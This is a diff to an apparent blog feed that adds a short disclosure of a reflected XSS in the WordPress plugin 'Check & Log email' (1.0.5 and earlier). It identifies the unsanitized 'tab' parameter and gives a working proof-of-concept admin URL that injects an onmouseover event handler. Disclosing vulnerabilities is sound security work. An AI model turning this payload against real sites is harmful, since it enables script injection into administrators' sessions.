@@ -4,6 +4,19 @@
   
   
   <entry>
+    <title>wp_check_email</title>
+    <link href="/2022/04/22/wp-check-email/"/>
+    <url>/2022/04/22/wp-check-email/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Check-amp-Log-email-lt-x3D-1-0-5-Reflected-XSS"><a href="#Check-amp-Log-email-lt-x3D-1-0-5-Reflected-XSS" class="headerlink" title="Check &amp; Log email &lt;&#x3D; 1.0.5 Reflected XSS"></a>Check &amp; Log email &lt;&#x3D; 1.0.5 Reflected XSS</h1><p>In file <code>check-email\include\Core\UI\Page\Check_Email_Settings_Page.php</code> <code>$_GET[&#39;tab&#39;]</code>does not sanitized and leading a Reflected XSS.</p><p><img src="/2022/04/22/wp-check-email/1.png"></p><p>POC:</p><figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/wp-admin/</span>admin.php?page=check-email-settings&amp;tab=<span class="hljs-string">&quot;&gt; &lt;input type=&quot;</span>text<span class="hljs-string">&quot; name=&quot;</span>test<span class="hljs-string">&quot; value=&quot;</span>xxxxx<span class="hljs-string">&quot; onmouseover=alert(1) test=&quot;</span><span class="hljs-string">&quot;/</span><br></code></pre></td></tr></table></figure><p><img src="/2022/04/22/wp-check-email/2.png"></p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>wp_call_now_button</title>
     <link href="/2022/04/22/wp-call-now-button/"/>
     <url>/2022/04/22/wp-call-now-button/</url>
